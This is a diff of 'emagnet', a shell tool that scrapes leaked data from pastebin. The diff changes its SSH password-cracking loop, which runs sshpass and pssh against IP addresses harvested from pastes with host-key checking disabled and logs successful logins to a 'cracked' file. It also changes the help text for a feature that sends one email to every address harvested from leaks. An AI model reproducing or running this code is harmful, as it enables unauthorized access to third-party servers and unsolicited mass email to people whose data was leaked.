@@ -79,6 +79,7 @@ Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
   -t, --time          Set refresh time in seconds
   -v, --vpn           Toggle VPN on or off (Linux Only)
                       - Available options: true/false
+                      - -v -p <provider> for set provider
   -V, --version       Displays version information.
   -i, --ip            Print you current WAN IPv4/IPv6
   -e, --emagnet       Download latest uploaded files on pastebin
@@ -89,7 +90,9 @@ Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
   -k, --kill          Kill emagnet ghost sessions
   -m, --merge         Merge all log files from incoming to archive
   -M, --move          Move all downloaded files to archive
-  -s, --spam          Send an email to all email addresses
+  -s, --spam          Send email to all targets 
+                      - Send email to targets in logs/emails-from-patebin.txt 
+                      - This is not meant to be used while emagnet is running
   -q, --quiet         Run emagnet in a screen
   -x, --syntax        Download uploads sorted by syntax
                        - Valid syntaxes available on pastebin.com/languages
@@ -273,10 +276,10 @@ VPNCONFIG2=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -2|ta
 VPNCONFIG3=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -3|tail -1)
 
 if [[ -z "$VPNPROVIDER" || -n "$VPNPROVIDER2" ]]; then
-	      export VPNCONFIG="$VPNCONFIG2"
+	export VPNCONFIG="$VPNCONFIG2"
         export VPNCOUNTRYS="$VPNCOUNTRYS2"
  elif [[ -z "$VPNPROVIDER" || -z "$VPNPROVIDER2" || -n "$VPNPROVIDER3" ]]; then
-	      export VPNCONFIG="$VPNCONFIG3"
+	export VPNCONFIG="$VPNCONFIG3"
         export VPNCOUNTRYS="$VPNCOUNTRYS3"
  else
        	export VPNCONFIG="$VPNCONFIG"
@@ -545,17 +548,17 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         printf "\n%64s\n" | tr ' ' '='
         sleep 2
        while read sshtargets; do
-          sshpass -p "root" pssh -I -A -h $SSHTARGETS "uptime" < $SSHTARGETS
+          sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -A -h $SSHTARGETS -i "uptime" < $SSHTARGETS
 		if [[ $? -eq "0" ]]; then
-		    	echo -e "[\e[1;32m>>\e[0m] - Cracked $sshtargets: $SSHUSER:$SSHPASSWORD"
+		    	echo -e "[\e[1;32m>>\e[0m] - Cracked $sshtargets: $SSHUSER:$SSHPASS"
     			echo -e "================================================================"        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-          echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"         >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-   		    echo -e "[+]------------------------------------------------------------"         >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-   			  echo -e "[+] Username: $SSHUSER"                                                  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
+                        echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"         >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
+   		        echo -e "[+]------------------------------------------------------------"         >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
+   			echo -e "[+] Username: $SSHUSER"                                                  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
     			echo -e "[+] Password: $SSHPASS"                                                  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
     			echo -e "================================================================\n\n"    >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
 		  else
- 			    echo -e "[\e[1;31m<<\e[0m] - Wrong Password For $sshtargets: $SSHUSER:$SSHPASSWORD"
+ 			    echo -e "[\e[1;31m<<\e[0m] - Wrong Password For $sshtargets: $SSHUSER:$SSHPASS"
                             echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS " >> $EMAGNETLOGS/failed-2-crack.txt
 		fi
 	    done < $SSHTARGETS
@@ -666,9 +669,9 @@ emagnet_clear;emagnet_banner
         read -p "- Do you want to send an email to all targets (yes/NO): " sendtoall
              case $sendtoall in
                   "yes")
-                     printf "%62s \n" | tr ' ' '='
+                     printf "\n%62s \n" | tr ' ' '='
                      grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > $HOME/.config/emagnet/tmp/.emagnet-spam
-                      while read e1; do printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]";done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
+                     while read e1; do printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]";done < "$HOME/.config/emagnet/tmp/.emagnet-spam"
                      rm "$HOME/.config/emagnet/tmp/.emagnet-spam" &> /dev/null
                    ;;
                   "*")
@@ -1039,6 +1042,11 @@ case "${1}" in
                 ;;
 
         "-v"|"-vpn"|"--vpn")
+                if [[ $1 -eq "-v" && $2 = "-p" && -n $3  ]]; then
+                         sed -i '164d' $CONF; sed -i "164 i VPNPROVIDER=\$VPNROOT/$3" $CONF
+                         printf "$basename$0: config file has been updated -- vpn provider has been set to $3\n "
+                         exit 1
+                fi
                 emagnet_conf
                 if [[ $VPNPROVIDER = "$VPNROOT/" && $VPNPROVIDER2 = "$VPNROOT/" && $VPNPROVIDER3 = "$VPNROOT/" ]]; then echo -e "$basename$0: internal error -- you must set a vpn provider before you can enable vpn";exit 1;fi
                 if [[ -z "$2" ]]; then echo -e "$basename$0: internal error -- you must include true or false";exit 1;fi
